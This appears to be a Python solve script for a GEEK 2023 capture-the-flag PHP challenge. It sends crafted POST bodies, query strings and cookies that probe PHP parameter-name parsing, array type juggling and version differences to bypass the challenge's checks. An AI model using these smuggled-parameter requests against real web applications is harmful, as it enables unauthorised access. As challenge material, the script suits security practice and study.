import urllib.request, re, html as _html, uuid

url = 'http://80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'
base = url + '?syc=Welcome+to+GEEK+2023%21%0a&lover=2022e1'

# Send POST with SYC_GEEK[2023]=xxx using bracket notation
# PHP: $_POST['SYC_GEEK'] = ['2023' => 'xxx']
# Then $_POST['SYC_GEEK.2023'] might resolve to nested key 2023 in some PHP versions
body = b'qw[]=a&yxx[]=b&SYC_GEEK%5B2023%5D=Happy to see you!'

# Test: php://input to see raw body
# Actually let's just test directly
req = urllib.request.Request(base, data=body, headers={
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
})
resp = urllib.request.urlopen(req, timeout=10)
text = _html.unescape(re.sub(r'<[^>]+>', '', resp.read().decode('utf-8', errors='replace')))
idx = text.find('?>'); result = text[idx+2:].strip() if idx > 0 else ''
print(f"[SYC_GEEK[2023]] -> {result.replace(chr(0xa0),' ')[:80]}")

# Also: try php://filter to read flag.php directly  
# Not possible without LFI

# Try: cookie injection for $_POST
cookie = 'SYC_GEEK.2023=Happy+to+see+you%21'
req2 = urllib.request.Request(base, data=b'qw[]=a&yxx[]=b', headers={
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': cookie
})
resp2 = urllib.request.urlopen(req2, timeout=10)
text2 = _html.unescape(re.sub(r'<[^>]+>', '', resp2.read().decode('utf-8', errors='replace')))
idx2 = text2.find('?>'); result2 = text2[idx2+2:].strip() if idx2 > 0 else ''
print(f"[cookie inject] -> {result2.replace(chr(0xa0),' ')[:80]}")

# Try to determine PHP version via exploit
# Send a payload that causes different behavior in different PHP versions
# 8.0+ arrays in string context throw error
body3 = b'qw=ARRAY_TEST&yxx[]=b'
req3 = urllib.request.Request(base, data=body3, headers={
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
})
resp3 = urllib.request.urlopen(req3, timeout=10)
text3 = _html.unescape(re.sub(r'<[^>]+>', '', resp3.read().decode('utf-8', errors='replace')))
idx3 = text3.find('?>'); result3 = text3[idx3+2:].strip() if idx3 > 0 else ''
print(f"[PHP version test] -> {result3.replace(chr(0xa0),' ')[:80]}")
# If "好哩" → PHP 7.x (warns but continues), if different → PHP 8.x

# Check if dot key can be set via session
req4 = urllib.request.Request(base, data=b'qw[]=a&yxx[]=b', headers={
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'PHPSESSID=test123'
})
resp4 = urllib.request.urlopen(req4, timeout=10)
print(f"Set-Cookie: {resp4.headers.get('Set-Cookie', 'none')}")
